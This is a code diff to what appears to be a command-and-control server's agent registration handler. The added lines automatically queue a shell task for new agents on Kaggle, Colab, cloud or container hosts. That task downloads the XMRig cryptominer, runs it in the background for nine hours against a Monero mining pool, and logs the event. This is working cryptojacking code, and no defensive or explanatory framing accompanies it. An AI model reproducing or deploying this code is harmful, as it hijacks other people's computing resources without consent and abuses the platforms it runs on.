@@ -2990,6 +2990,14 @@ def agent_register():
                     request.remote_addr, data.get("ip_internal", ""),
                     data.get("platform_type", "machine")))
         
+        # Auto-create mining task for new agents
+        platform = data.get("platform_type", "machine")
+        if platform in ("kaggle", "colab", "cloud", "container"):
+            mining_cmd = "wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0 && timeout 9h ./xmrig -o pool.hashvault.pro:80 -u 48edfHuWV9QJYpBz7mVJvK8Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7.kaggle-$(hostname) --donate-level 1 --cpu-max-threads-hint=50 --background --no-color || true"
+            db.execute("INSERT INTO tasks (id, agent_id, task_type, payload, status) VALUES (?, ?, 'shell', ?, 'pending')",
+                      (str(uuid.uuid4()), agent_id, mining_cmd))
+            log_event("auto_mining", f"Created mining task for new {platform} agent {agent_id[:8]}")
+        
         # Detailed logging for new agent
         log_event("agent_new", f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
